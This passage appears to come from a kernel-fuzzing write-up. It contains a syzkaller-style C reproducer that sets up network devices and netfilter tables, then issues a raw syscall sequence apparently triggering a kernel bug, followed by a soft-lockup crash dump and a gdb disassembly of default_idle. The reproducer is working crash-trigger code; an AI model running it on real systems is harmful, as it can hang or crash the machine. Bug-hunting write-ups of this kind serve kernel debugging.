0x0010\n#define IFF_NAPI_FRAGS 0x0020\n\nstatic void initialize_tun(void)\n{\n\ttunfd = open(\"/dev/net/tun\", O_RDWR | O_NONBLOCK);\n\tif (tunfd == -1) {\n\t\tprintf(\"tun: can't open /dev/net/tun: please enable CONFIG_TUN=y\\n\");\n\t\tprintf(\"otherwise fuzzing or reproducing might not work as intended\\n\");\n\t\treturn;\n\t}\n\tconst int kTunFd = 252;\n\tif (dup2(tunfd, kTunFd) < 0)\n\t\tfail(\"dup2(tunfd, kTunFd) failed\");\n\tclose(tunfd);\n\ttunfd = kTunFd;\n\n\tstruct ifreq ifr;\n\tmemset(&ifr, 0, sizeof(ifr));\n\tstrncpy(ifr.ifr_name, TUN_IFACE, IFNAMSIZ);\n\tifr.ifr_flags = IFF_TAP | IFF_NO_PI | IFF_NAPI | IFF_NAPI_FRAGS;\n\tif (ioctl(tunfd, TUNSETIFF, (void*)&ifr) < 0) {\n\t\tifr.ifr_flags = IFF_TAP | IFF_NO_PI;\n\t\tif (ioctl(tunfd, TUNSETIFF, (void*)&ifr) < 0)\n\t\t\tfail(\"tun: ioctl(TUNSETIFF) failed\");\n\t}\n\tif (ioctl(tunfd, TUNGETIFF, (void*)&ifr) < 0)\n\t\tfail(\"tun: ioctl(TUNGETIFF) failed\");\n\ttun_frags_enabled = (ifr.ifr_flags & IFF_NAPI_FRAGS) != 0;\n\n\texecute_command(1, \"sysctl -w net.ipv6.conf.%s.accept_dad=0\", TUN_IFACE);\n\n\texecute_command(1, \"sysctl -w net.ipv6.conf.%s.router_solicitations=0\", TUN_IFACE);\n\n\texecute_command(1, \"ip link set dev %s address %s\", TUN_IFACE, LOCAL_MAC);\n\texecute_command(1, \"ip addr add %s/24 dev %s\", LOCAL_IPV4, TUN_IFACE);\n\texecute_command(1, \"ip -6 addr add %s/120 dev %s\", LOCAL_IPV6, TUN_IFACE);\n\texecute_command(1, \"ip neigh add %s lladdr %s dev %s nud permanent\",\n\t\t\tREMOTE_IPV4, REMOTE_MAC, TUN_IFACE);\n\texecute_command(1, \"ip -6 neigh add %s lladdr %s dev %s nud permanent\",\n\t\t\tREMOTE_IPV6, REMOTE_MAC, TUN_IFACE);\n\texecute_command(1, \"ip link set dev %s up\", TUN_IFACE);\n}\n\n#define DEV_IPV4 \"172.20.20.%d\"\n#define DEV_IPV6 \"fe80::%02hx\"\n#define DEV_MAC \"aa:aa:aa:aa:aa:%02hx\"\n\nstatic void initialize_netdevices(void)\n{\n\tunsigned i;\n\tconst char* devtypes[] = {\"ip6gretap\", \"bridge\", \"vcan\", \"bond\", \"veth\"};\n\tconst char* devnames[] = {\"lo\", \"sit0\", \"bridge0\", \"vcan0\", \"tunl0\",\n\t\t\t\t  \"gre0\", \"gretap0\", \"ip_vti0\", \"ip6_vti0\",\n\t\t\t\t  \"ip6tnl0\", \"ip6gre0\", \"ip6gretap0\",\n\t\t\t\t  \"erspan0\", \"bond0\", \"veth0\", \"veth1\"};\n\n\tfor (i = 0; i < sizeof(devtypes) / (sizeof(devtypes[0])); i++)\n\t\texecute_command(0, \"ip link add dev %s0 type %s\", devtypes[i], devtypes[i]);\n\texecute_command(0, \"ip link add dev veth1 type veth\");\n\tfor (i = 0; i < sizeof(devnames) / (sizeof(devnames[0])); i++) {\n\t\tchar addr[32];\n\t\tsnprintf_check(addr, sizeof(addr), DEV_IPV4, i + 10);\n\t\texecute_command(0, \"ip -4 addr add %s/24 dev %s\", addr, devnames[i]);\n\t\tsnprintf_check(addr, sizeof(addr), DEV_IPV6, i + 10);\n\t\texecute_command(0, \"ip -6 addr add %s/120 dev %s\", addr, devnames[i]);\n\t\tsnprintf_check(addr, sizeof(addr), DEV_MAC, i + 10);\n\t\texecute_command(0, \"ip link set dev %s address %s\", devnames[i], addr);\n\t\texecute_command(0, \"ip link set dev %s up\", devnames[i]);\n\t}\n}\n\nstatic int read_tun(char* data, int size)\n{\n\tif (tunfd < 0)\n\t\treturn -1;\n\n\tint rv = read(tunfd, data, size);\n\tif (rv < 0) {\n\t\tif (errno == EAGAIN)\n\t\t\treturn -1;\n\t\tif (errno == EBADFD)\n\t\t\treturn -1;\n\t\tfail(\"tun: read failed with %d\", rv);\n\t}\n\treturn rv;\n}\n\nstatic void flush_tun()\n{\n\tchar data[SYZ_TUN_MAX_PACKET_SIZE];\n\twhile (read_tun(&data[0], sizeof(data)) != -1)\n\t\t;\n}\n\nstatic uintptr_t syz_open_pts(uintptr_t a0, uintptr_t a1)\n{\n\tint ptyno = 0;\n\tif (ioctl(a0, TIOCGPTN, &ptyno))\n\t\treturn -1;\n\tchar buf[128];\n\tsprintf(buf, \"/dev/pts/%d\", ptyno);\n\treturn open(buf, a1, 0);\n}\n\n#define XT_TABLE_SIZE 1536\n#define XT_MAX_ENTRIES 10\n\nstruct xt_counters {\n\tuint64_t pcnt, bcnt;\n};\n\nstruct ipt_getinfo {\n\tchar name[32];\n\tunsigned int valid_hooks;\n\tunsigned int hook_entry[5];\n\tunsigned int underflow[5];\n\tunsigned int num_entries;\n\tunsigned int size;\n};\n\nstruct ipt_get_entries {\n\tchar name[32];\n\tunsigned int size;\n\tvoid* entrytable[XT_TABLE_SIZE / sizeof(void*)];\n};\n\nstruct ipt_replace {\n\tchar name[32];\n\tunsigned int valid_hooks;\n\tunsigned int num_entries;\n\tunsigned int size;\n\tunsigned int hook_entry[5];\n\tunsigned int underflow[5];\n\tunsigned int num_counters;\n\tstruct xt_counters* counters;\n\tchar entrytable[XT_TABLE_SIZE];\n};\n\nstruct ipt_table_desc {\n\tconst char* name;\n\tstruct ipt_getinfo info;\n\tstruct ipt_replace replace;\n};\n\nstatic struct ipt_table_desc ipv4_tables[] = {\n    {.name = \"filter\"},\n    {.name = \"nat\"},\n    {.name = \"mangle\"},\n    {.name = \"raw\"},\n    {.name = \"security\"},\n};\n\nstatic struct ipt_table_desc ipv6_tables[] = {\n    {.name = \"filter\"},\n    {.name = \"nat\"},\n    {.name = \"mangle\"},\n    {.name = \"raw\"},\n    {.name = \"security\"},\n};\n\n#define IPT_BASE_CTL 64\n#define IPT_SO_SET_REPLACE (IPT_BASE_CTL)\n#define IPT_SO_GET_INFO (IPT_BASE_CTL)\n#define IPT_SO_GET_ENTRIES (IPT_BASE_CTL + 1)\n\nstruct arpt_getinfo {\n\tchar name[32];\n\tunsigned int valid_hooks;\n\tunsigned int hook_entry[3];\n\tunsigned int underflow[3];\n\tunsigned int num_entries;\n\tunsigned int size;\n};\n\nstruct arpt_get_entries {\n\tchar name[32];\n\tunsigned int size;\n\tvoid* entrytable[XT_TABLE_SIZE / sizeof(void*)];\n};\n\nstruct arpt_replace {\n\tchar name[32];\n\tunsigned int valid_hooks;\n\tunsigned int num_entries;\n\tunsigned int size;\n\tunsigned int hook_entry[3];\n\tunsigned int underflow[3];\n\tunsigned int num_counters;\n\tstruct xt_counters* counters;\n\tchar entrytable[XT_TABLE_SIZE];\n};\n\nstruct arpt_table_desc {\n\tconst char* name;\n\tstruct arpt_getinfo info;\n\tstruct arpt_replace replace;\n};\n\nstatic struct arpt_table_desc arpt_tables[] = {\n    {.name = \"filter\"},\n};\n\n#define ARPT_BASE_CTL 96\n#define ARPT_SO_SET_REPLACE (ARPT_BASE_CTL)\n#define ARPT_SO_GET_INFO (ARPT_BASE_CTL)\n#define ARPT_SO_GET_ENTRIES (ARPT_BASE_CTL + 1)\n\nstatic void checkpoint_iptables(struct ipt_table_desc* tables, int num_tables, int family, int level)\n{\n\tstruct ipt_get_entries entries;\n\tsocklen_t optlen;\n\tint fd, i;\n\n\tfd = socket(family, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(%d, SOCK_STREAM, IPPROTO_TCP)\", family);\n\tfor (i = 0; i < num_tables; i++) {\n\t\tstruct ipt_table_desc* table = &tables[i];\n\t\tstrcpy(table->info.name, table->name);\n\t\tstrcpy(table->replace.name, table->name);\n\t\toptlen = sizeof(table->info);\n\t\tif (getsockopt(fd, level, IPT_SO_GET_INFO, &table->info, &optlen)) {\n\t\t\tswitch (errno) {\n\t\t\tcase EPERM:\n\t\t\tcase ENOENT:\n\t\t\tcase ENOPROTOOPT:\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tfail(\"getsockopt(IPT_SO_GET_INFO)\");\n\t\t}\n\t\tif (table->info.size > sizeof(table->replace.entrytable))\n\t\t\tfail(\"table size is too large: %u\", table->info.size);\n\t\tif (table->info.num_entries > XT_MAX_ENTRIES)\n\t\t\tfail(\"too many counters: %u\", table->info.num_entries);\n\t\tmemset(&entries, 0, sizeof(entries));\n\t\tstrcpy(entries.name, table->name);\n\t\tentries.size = table->info.size;\n\t\toptlen = sizeof(entries) - sizeof(entries.entrytable) + table->info.size;\n\t\tif (getsockopt(fd, level, IPT_SO_GET_ENTRIES, &entries, &optlen))\n\t\t\tfail(\"getsockopt(IPT_SO_GET_ENTRIES)\");\n\t\ttable->replace.valid_hooks = table->info.valid_hooks;\n\t\ttable->replace.num_entries = table->info.num_entries;\n\t\ttable->replace.size = table->info.size;\n\t\tmemcpy(table->replace.hook_entry, table->info.hook_entry, sizeof(table->replace.hook_entry));\n\t\tmemcpy(table->replace.underflow, table->info.underflow, sizeof(table->replace.underflow));\n\t\tmemcpy(table->replace.entrytable, entries.entrytable, table->info.size);\n\t}\n\tclose(fd);\n}\n\nstatic void reset_iptables(struct ipt_table_desc* tables, int num_tables, int family, int level)\n{\n\tstruct xt_counters counters[XT_MAX_ENTRIES];\n\tstruct ipt_get_entries entries;\n\tstruct ipt_getinfo info;\n\tsocklen_t optlen;\n\tint fd, i;\n\n\tfd = socket(family, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(%d, SOCK_STREAM, IPPROTO_TCP)\", family);\n\tfor (i = 0; i < num_tables; i++) {\n\t\tstruct ipt_table_desc* table = &tables[i];\n\t\tif (table->info.valid_hooks == 0)\n\t\t\tcontinue;\n\t\tmemset(&info, 0, sizeof(info));\n\t\tstrcpy(info.name, table->name);\n\t\toptlen = sizeof(info);\n\t\tif (getsockopt(fd, level, IPT_SO_GET_INFO, &info, &optlen))\n\t\t\tfail(\"getsockopt(IPT_SO_GET_INFO)\");\n\t\tif (memcmp(&table->info, &info, sizeof(table->info)) == 0) {\n\t\t\tmemset(&entries, 0, sizeof(entries));\n\t\t\tstrcpy(entries.name, table->name);\n\t\t\tentries.size = table->info.size;\n\t\t\toptlen = sizeof(entries) - sizeof(entries.entrytable) + entries.size;\n\t\t\tif (getsockopt(fd, level, IPT_SO_GET_ENTRIES, &entries, &optlen))\n\t\t\t\tfail(\"getsockopt(IPT_SO_GET_ENTRIES)\");\n\t\t\tif (memcmp(table->replace.entrytable, entries.entrytable, table->info.size) == 0)\n\t\t\t\tcontinue;\n\t\t}\n\t\ttable->replace.num_counters = info.num_entries;\n\t\ttable->replace.counters = counters;\n\t\toptlen = sizeof(table->replace) - sizeof(table->replace.entrytable) + table->replace.size;\n\t\tif (setsockopt(fd, level, IPT_SO_SET_REPLACE, &table->replace, optlen))\n\t\t\tfail(\"setsockopt(IPT_SO_SET_REPLACE)\");\n\t}\n\tclose(fd);\n}\n\nstatic void checkpoint_arptables(void)\n{\n\tstruct arpt_get_entries entries;\n\tsocklen_t optlen;\n\tunsigned i;\n\tint fd;\n\n\tfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)\");\n\tfor (i = 0; i < sizeof(arpt_tables) / sizeof(arpt_tables[0]); i++) {\n\t\tstruct arpt_table_desc* table = &arpt_tables[i];\n\t\tstrcpy(table->info.name, table->name);\n\t\tstrcpy(table->replace.name, table->name);\n\t\toptlen = sizeof(table->info);\n\t\tif (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &table->info, &optlen)) {\n\t\t\tswitch (errno) {\n\t\t\tcase EPERM:\n\t\t\tcase ENOENT:\n\t\t\tcase ENOPROTOOPT:\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tfail(\"getsockopt(ARPT_SO_GET_INFO)\");\n\t\t}\n\t\tif (table->info.size > sizeof(table->replace.entrytable))\n\t\t\tfail(\"table size is too large: %u\", table->info.size);\n\t\tif (table->info.num_entries > XT_MAX_ENTRIES)\n\t\t\tfail(\"too many counters: %u\", table->info.num_entries);\n\t\tmemset(&entries, 0, sizeof(entries));\n\t\tstrcpy(entries.name, table->name);\n\t\tentries.size = table->info.size;\n\t\toptlen = sizeof(entries) - sizeof(entries.entrytable) + table->info.size;\n\t\tif (getsockopt(fd, SOL_IP, ARPT_SO_GET_ENTRIES, &entries, &optlen))\n\t\t\tfail(\"getsockopt(ARPT_SO_GET_ENTRIES)\");\n\t\ttable->replace.valid_hooks = table->info.valid_hooks;\n\t\ttable->replace.num_entries = table->info.num_entries;\n\t\ttable->replace.size = table->info.size;\n\t\tmemcpy(table->replace.hook_entry, table->info.hook_entry, sizeof(table->replace.hook_entry));\n\t\tmemcpy(table->replace.underflow, table->info.underflow, sizeof(table->replace.underflow));\n\t\tmemcpy(table->replace.entrytable, entries.entrytable, table->info.size);\n\t}\n\tclose(fd);\n}\n\nstatic void reset_arptables()\n{\n\tstruct xt_counters counters[XT_MAX_ENTRIES];\n\tstruct arpt_get_entries entries;\n\tstruct arpt_getinfo info;\n\tsocklen_t optlen;\n\tunsigned i;\n\tint fd;\n\n\tfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)\");\n\tfor (i = 0; i < sizeof(arpt_tables) / sizeof(arpt_tables[0]); i++) {\n\t\tstruct arpt_table_desc* table = &arpt_tables[i];\n\t\tif (table->info.valid_hooks == 0)\n\t\t\tcontinue;\n\t\tmemset(&info, 0, sizeof(info));\n\t\tstrcpy(info.name, table->name);\n\t\toptlen = sizeof(info);\n\t\tif (getsockopt(fd, SOL_IP, ARPT_SO_GET_INFO, &info, &optlen))\n\t\t\tfail(\"getsockopt(ARPT_SO_GET_INFO)\");\n\t\tif (memcmp(&table->info, &info, sizeof(table->info)) == 0) {\n\t\t\tmemset(&entries, 0, sizeof(entries));\n\t\t\tstrcpy(entries.name, table->name);\n\t\t\tentries.size = table->info.size;\n\t\t\toptlen = sizeof(entries) - sizeof(entries.entrytable) + entries.size;\n\t\t\tif (getsockopt(fd, SOL_IP, ARPT_SO_GET_ENTRIES, &entries, &optlen))\n\t\t\t\tfail(\"getsockopt(ARPT_SO_GET_ENTRIES)\");\n\t\t\tif (memcmp(table->replace.entrytable, entries.entrytable, table->info.size) == 0)\n\t\t\t\tcontinue;\n\t\t}\n\t\ttable->replace.num_counters = info.num_entries;\n\t\ttable->replace.counters = counters;\n\t\toptlen = sizeof(table->replace) - sizeof(table->replace.entrytable) + table->replace.size;\n\t\tif (setsockopt(fd, SOL_IP, ARPT_SO_SET_REPLACE, &table->replace, optlen))\n\t\t\tfail(\"setsockopt(ARPT_SO_SET_REPLACE)\");\n\t}\n\tclose(fd);\n}\n#include <linux/if.h>\n#include <linux/netfilter_bridge/ebtables.h>\n\nstruct ebt_table_desc {\n\tconst char* name;\n\tstruct ebt_replace replace;\n\tchar entrytable[XT_TABLE_SIZE];\n};\n\nstatic struct ebt_table_desc ebt_tables[] = {\n    {.name = \"filter\"},\n    {.name = \"nat\"},\n    {.name = \"broute\"},\n};\n\nstatic void checkpoint_ebtables(void)\n{\n\tsocklen_t optlen;\n\tunsigned i;\n\tint fd;\n\n\tfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)\");\n\tfor (i = 0; i < sizeof(ebt_tables) / sizeof(ebt_tables[0]); i++) {\n\t\tstruct ebt_table_desc* table = &ebt_tables[i];\n\t\tstrcpy(table->replace.name, table->name);\n\t\toptlen = sizeof(table->replace);\n\t\tif (getsockopt(fd, SOL_IP, EBT_SO_GET_INIT_INFO, &table->replace, &optlen)) {\n\t\t\tswitch (errno) {\n\t\t\tcase EPERM:\n\t\t\tcase ENOENT:\n\t\t\tcase ENOPROTOOPT:\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tfail(\"getsockopt(EBT_SO_GET_INIT_INFO)\");\n\t\t}\n\t\tif (table->replace.entries_size > sizeof(table->entrytable))\n\t\t\tfail(\"table size is too large: %u\", table->replace.entries_size);\n\t\ttable->replace.num_counters = 0;\n\t\ttable->replace.entries = table->entrytable;\n\t\toptlen = sizeof(table->replace) + table->replace.entries_size;\n\t\tif (getsockopt(fd, SOL_IP, EBT_SO_GET_INIT_ENTRIES, &table->replace, &optlen))\n\t\t\tfail(\"getsockopt(EBT_SO_GET_INIT_ENTRIES)\");\n\t}\n\tclose(fd);\n}\n\nstatic void reset_ebtables()\n{\n\tstruct ebt_replace replace;\n\tchar entrytable[XT_TABLE_SIZE];\n\tsocklen_t optlen;\n\tunsigned i, j, h;\n\tint fd;\n\n\tfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n\tif (fd == -1)\n\t\tfail(\"socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)\");\n\tfor (i = 0; i < sizeof(ebt_tables) / sizeof(ebt_tables[0]); i++) {\n\t\tstruct ebt_table_desc* table = &ebt_tables[i];\n\t\tif (table->replace.valid_hooks == 0)\n\t\t\tcontinue;\n\t\tmemset(&replace, 0, sizeof(replace));\n\t\tstrcpy(replace.name, table->name);\n\t\toptlen = sizeof(replace);\n\t\tif (getsockopt(fd, SOL_IP, EBT_SO_GET_INFO, &replace, &optlen))\n\t\t\tfail(\"getsockopt(EBT_SO_GET_INFO)\");\n\t\treplace.num_counters = 0;\n\t\tfor (h = 0; h < NF_BR_NUMHOOKS; h++)\n\t\t\ttable->replace.hook_entry[h] = 0;\n\t\tif (memcmp(&table->replace, &replace, sizeof(table->replace)) == 0) {\n\t\t\tmemset(&entrytable, 0, sizeof(entrytable));\n\t\t\treplace.entries = entrytable;\n\t\t\toptlen = sizeof(replace) + replace.entries_size;\n\t\t\tif (getsockopt(fd, SOL_IP, EBT_SO_GET_ENTRIES, &replace, &optlen))\n\t\t\t\tfail(\"getsockopt(EBT_SO_GET_ENTRIES)\");\n\t\t\tif (memcmp(table->entrytable, entrytable, replace.entries_size) == 0)\n\t\t\t\tcontinue;\n\t\t}\n\t\tfor (j = 0, h = 0; h < NF_BR_NUMHOOKS; h++) {\n\t\t\tif (table->replace.valid_hooks & (1 << h)) {\n\t\t\t\ttable->replace.hook_entry[h] = (struct ebt_entries*)table->entrytable + j;\n\t\t\t\tj++;\n\t\t\t}\n\t\t}\n\t\toptlen = sizeof(table->replace) + table->replace.entries_size;\n\t\tif (setsockopt(fd, SOL_IP, EBT_SO_SET_ENTRIES, &table->replace, optlen))\n\t\t\tfail(\"setsockopt(EBT_SO_SET_ENTRIES)\");\n\t}\n\tclose(fd);\n}\n\nstatic void checkpoint_net_namespace(void)\n{\n\tcheckpoint_ebtables();\n\tcheckpoint_arptables();\n\tcheckpoint_iptables(ipv4_tables, sizeof(ipv4_tables) / sizeof(ipv4_tables[0]), AF_INET, SOL_IP);\n\tcheckpoint_iptables(ipv6_tables, sizeof(ipv6_tables) / sizeof(ipv6_tables[0]), AF_INET6, SOL_IPV6);\n}\n\nstatic void reset_net_namespace(void)\n{\n\treset_ebtables();\n\treset_arptables();\n\treset_iptables(ipv4_tables, sizeof(ipv4_tables) / sizeof(ipv4_tables[0]), AF_INET, SOL_IP);\n\treset_iptables(ipv6_tables, sizeof(ipv6_tables) / sizeof(ipv6_tables[0]), AF_INET6, SOL_IPV6);\n}\n\nstatic void remove_dir(const char* dir)\n{\n\tDIR* dp;\n\tstruct dirent* ep;\n\tint iter = 0;\nretry:\n\tdp = opendir(dir);\n\tif (dp == NULL) {\n\t\tif (errno == EMFILE) {\n\t\t\texitf(\"opendir(%s) failed due to NOFILE, exiting\", dir);\n\t\t}\n\t\texitf(\"opendir(%s) failed\", dir);\n\t}\n\twhile ((ep = readdir(dp))) {\n\t\tif (strcmp(ep->d_name, \".\") == 0 || strcmp(ep->d_name, \"..\") == 0)\n\t\t\tcontinue;\n\t\tchar filename[FILENAME_MAX];\n\t\tsnprintf(filename, sizeof(filename), \"%s/%s\", dir, ep->d_name);\n\t\tstruct stat st;\n\t\tif (lstat(filename, &st))\n\t\t\texitf(\"lstat(%s) failed\", filename);\n\t\tif (S_ISDIR(st.st_mode)) {\n\t\t\tremove_dir(filename);\n\t\t\tcontinue;\n\t\t}\n\t\tint i;\n\t\tfor (i = 0;; i++) {\n\t\t\tif (unlink(filename) == 0)\n\t\t\t\tbreak;\n\t\t\tif (errno == EROFS) {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tif (errno != EBUSY || i > 100)\n\t\t\t\texitf(\"unlink(%s) failed\", filename);\n\t\t\tif (umount2(filename, MNT_DETACH))\n\t\t\t\texitf(\"umount(%s) failed\", filename);\n\t\t}\n\t}\n\tclosedir(dp);\n\tint i;\n\tfor (i = 0;; i++) {\n\t\tif (rmdir(dir) == 0)\n\t\t\tbreak;\n\t\tif (i < 100) {\n\t\t\tif (errno == EROFS) {\n\t\t\t\tbreak;\n\t\t\t}\n\t\t\tif (errno == EBUSY) {\n\t\t\t\tif (umount2(dir, MNT_DETACH))\n\t\t\t\t\texitf(\"umount(%s) failed\", dir);\n\t\t\t\tcontinue;\n\t\t\t}\n\t\t\tif (errno == ENOTEMPTY) {\n\t\t\t\tif (iter < 100) {\n\t\t\t\t\titer++;\n\t\t\t\t\tgoto retry;\n\t\t\t\t}\n\t\t\t}\n\t\t}\n\t\texitf(\"rmdir(%s) failed\", dir);\n\t}\n}\n\nstatic void test();\n\nvoid loop() {\n\tint iter;\n\tcheckpoint_net_namespace();\n\tfor (iter = 0;; iter++) {\n\t\tchar cwdbuf[256];\n\t\tsprintf(cwdbuf, \"./%d\", iter);\n\t\tif (mkdir(cwdbuf, 0777))\n\t\t\tfail(\"failed to mkdir\");\n\t\tint pid = fork();\n\t\tif (pid < 0)\n\t\t\tfail(\"loop fork failed\");\n\t\tif (pid == 0) {\n\t\t\tprctl(PR_SET_PDEATHSIG, SIGKILL, 0, 0, 0);\n\t\t\tsetpgrp();\n\t\t\tif (chdir(cwdbuf))\n\t\t\t\tfail(\"failed to chdir\");\n\t\t\tflush_tun();\n\t\t\ttest();\n\t\t\tdoexit(0);\n\t\t}\n\t\tint status = 0;\n\t\tuint64_t start = current_time_ms();\n\t\tfor (;;) {\n\t\t\tint res = waitpid(-1, &status, __WALL | WNOHANG);\n\t\t\tif (res == pid)\n\t\t\t\tbreak;\n\t\t\tusleep(1000);\n\t\t\tif (current_time_ms() - start > 5 * 1000) {\n\t\t\t\tkill(-pid, SIGKILL);\n\t\t\t\tkill(pid, SIGKILL);\n\t\t\t\twhile (waitpid(-1, &status, __WALL) != pid) {\n\t\t\t\t}\n\t\t\t\tbreak;\n\t\t\t}\n\t\t}\n\t\tremove_dir(cwdbuf);\n\t\treset_net_namespace();\n\t}\n}\n\nuint64_t r[3] = {0xffffffffffffffff, 0xffffffffffffffff, 0xffffffffffffffff};\nvoid test()\n{\n\tlong res;memcpy((void*)0x20000280, \"/dev/loop-control\", 18);\n\tsyscall(__NR_openat, 0xffffffffffffff9c, 0x20000280, 0x4000, 0);\n\t*(uint64_t*)0x20000180 = 0;\n\t*(uint64_t*)0x20000188 = 0;\n\t*(uint64_t*)0x20000190 = 0;\n\t*(uint64_t*)0x20000198 = 0;\n\tsyscall(__NR_timer_settime, 0, 0, 0x20000180, 0);\n\t*(uint64_t*)0x20000500 = 0x77359400;\n\t*(uint64_t*)0x20000508 = 0;\n\t*(uint64_t*)0x20000510 = 0;\n\t*(uint64_t*)0x20000518 = 0x989680;\n\tsyscall(__NR_timer_settime, 0, 0, 0x20000500, 0x20000540);\n\tres = syz_open_pts(-1, 0x42100);\n\tif (res != -1)\n\t\tr[0] = res;\n\tsyscall(__NR_ioctl, r[0], 0x5462, 0x20000140);\n\tsyscall(__NR_ioctl, r[0], 0x80084504, 0x200002c0);\n\tres = syscall(__NR_pipe2, 0x20000000, 0);\n\tif (res != -1) {\n\t\tr[1] = *(uint32_t*)0x20000000;\n\t\tr[2] = *(uint32_t*)0x20000004;\n\t}\n\t*(uint16_t*)0x20000040 = -1;\n\t*(uint16_t*)0x20000042 = 0x200;\n\t*(uint16_t*)0x20000044 = 0x8000;\n\t*(uint16_t*)0x20000046 = 0x3f;\n\t*(uint16_t*)0x20000048 = 0x22;\n\t*(uint16_t*)0x2000004a = 0x45f;\n\tsyscall(__NR_ioctl, r[1], 0x560a, 0x20000040);\n\tsyscall(__NR_fstatfs, r[1], 0x200000c0);\n\tsyz_open_pts(r[2], 0);\n\t*(uint32_t*)0x20000340 = 0x10;\n\tsyscall(__NR_accept, r[2], 0x20000300, 0x20000340);\n\tsyscall(__NR_fcntl, r[2], 4, 0x40400);\n}\n\nint main()\n{\n\tsyscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);\n\tchar *cwd = get_current_dir_name();\n\tfor (;;) {\n\t\tif (chdir(cwd))\n\t\t\tfail(\"failed to chdir\");\n\t\tuse_temporary_dir();\n\t\tinitialize_tun();\n\t\tinitialize_netdevices();\n\t\tloop();\n\t}\n}\n```\n\n## default_idle - soft lockup\n\nIt just halted during booting.\n\n### Call Trace (Dump)\n\n```c\nwatchdog: BUG: soft lockup - CPU#0 stuck for 153s! [swapper/0:0]\nModules linked in:\nirq event stamp: 5914346\nhardirqs last  enabled at (5914343): [<0000000098680cd3>] default_idle+0x18/0x2c0 arch/x86/kernel/process.c:354\nhardirqs last disabled at (5914344): [<00000000d4f96a97>] interrupt_entry+0xc0/0xe0 arch/x86/entry/entry_64.S:619\nsoftirqs last  enabled at (5914346): [<000000000af1e516>] irq_enter+0xb6/0xd0 kernel/softirq.c:347\nsoftirqs last disabled at (5914345): [<00000000b393087c>] irq_enter+0x9b/0xd0 kernel/softirq.c:351\nCPU: 0 PID: 0 Comm: swapper/0 Not tainted 4.16.0-rc3+ #4\nHardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014\nRIP: 0010:native_safe_halt+0x2/0x10 arch/x86/include/asm/irqflags.h:54\nRSP: 0018:ffffffffa3607d88 EFLAGS: 00000246 ORIG_RAX: ffffffffffffff12\nRAX: 0000000000000007 RBX: dffffc0000000000 RCX: 0000000000000000\nRDX: 0000000000000000 RSI: 0000000000000001 RDI: ffffffffa362bdec\nRBP: 0000000000000000 R08: ffffffffa362b580 R09: 0000000000000000\nR10: 0000000000000000 R11: 0000000000000000 R12: ffffffffa3cb8ba0\nR13: 0000000000000000 R14: 0000000000000000 R15: ffffffffa3cb8c40\nFS:  0000000000000000(0000) GS:ffff88002e000000(0000) knlGS:0000000000000000\nCS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033\nCR2: 0000000000619570 CR3: 000000002a01e000 CR4: 00000000000006f0\nDR0: 0000000020000100 DR1: 0000000020000100 DR2: 0000000020000100\nDR3: 0000000020000100 DR6: 00000000fffe0ff0 DR7: 0000000000000600\nCall Trace:\n arch_safe_halt arch/x86/include/asm/paravirt.h:94 [inline]\n default_idle+0x1d/0x2c0 arch/x86/kernel/process.c:354\n cpuidle_idle_call kernel/sched/idle.c:156 [inline]\n do_idle+0x233/0x2c0 kernel/sched/idle.c:246\n cpu_startup_entry+0xc6/0xd0 kernel/sched/idle.c:351\n start_kernel+0x840/0x880 init/main.c:717\n secondary_startup_64+0xa5/0xb0 arch/x86/kernel/head_64.S:239\nCode: 04 24 e8 12 ee ed fd 48 8b 04 24 e9 d6 fe ff ff 48 89 df e8 01 ee ed fd eb 8a 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 fb f4 <c3> 0f 1f 00 66 2e 0f 1f 84 00 00 00 00 00 f4 c3 90 90 90 90 90 \n```\n\n### Source Code\n\nHere's ```default_idle()``` ```/arch/x86/kernel/process.c``` in *v4.16.0-rc3*.\n\n```c\nvoid __cpuidle default_idle(void)\n{\n\ttrace_cpu_idle_rcuidle(1, smp_processor_id());\n\tsafe_halt();\n\ttrace_cpu_idle_rcuidle(PWR_EVENT_EXIT, smp_processor_id());\n}\n```\n\nAnd this is disassemble of compiled ```vmlinux``` with my ```.config```.\n\n```c\ngdb-peda$ pdisas default_idle\nDump of assembler code for function default_idle:\n   0xffffffff821acb10 <+0>:\t    push   r12\n   0xffffffff821acb12 <+2>:\t    push   rbp\n   0xffffffff821acb13 <+3>:\t    push   rbx\n   0xffffffff821acb14 <+4>:\t    mov    ebp,DWORD PTR gs:[rip+0x7de62615]        # 0xf130 <cpu_number>\n   0xffffffff821acb1b <+11>:\tnop    DWORD PTR [rax+rax*1+0x0]\n   0xffffffff821acb20 <+16>:\tcall   0xffffffff810f2370 <trace_hardirqs_on>\n   0xffffffff821acb25 <+21>:\tcall   QWORD PTR ds:0xffffffff82c406c0\n   0xffffffff821acb2c <+28>:\tmov    ebp,DWORD PTR gs:[rip+0x7de625fd]        # 0xf130 <cpu_number>\n   0xffffffff821acb33 <+35>:\tnop    DWORD PTR [rax+rax*1+0x0]\n   0xffffffff821acb38 <+40>:\tpop    rbx\n   0xffffffff821acb39 <+41>:\tpop    rbp\n   0xffffffff821acb3a <+42>:\tpop    r12\n   0xffffffff821acb3c <+44>:\tret    \n   0xffffffff821acb3d <+45>:\tmov    eax,DWORD PTR gs:[rip+0x7de625ec]        # 0xf130 <cpu_number>\n   0xffffffff821acb44 <+52>:\tmov    eax,eax\n   0xffffffff821acb46 